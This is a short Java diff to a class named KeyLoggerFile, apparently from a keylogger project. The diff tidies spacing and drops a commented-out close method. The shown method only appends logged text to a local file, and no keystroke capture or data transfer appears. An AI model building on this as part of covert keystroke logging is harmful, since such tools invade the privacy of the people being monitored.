@@ -8,15 +8,11 @@ public class KeyLoggerFile {
 
     public void keyLoggerWriter(CharSequence log) throws IOException {
         try{
-            myWriter = new FileWriter("filename.txt",true);
+            myWriter = new FileWriter("filename.txt", true);
         } catch (IOException e) {
             e.printStackTrace();
         }
         myWriter.append(log);
         myWriter.close();
     }
-
-//    public void keyLoggerWriterClose() throws IOException {
-//        myWriter.close();
-//    }
 }
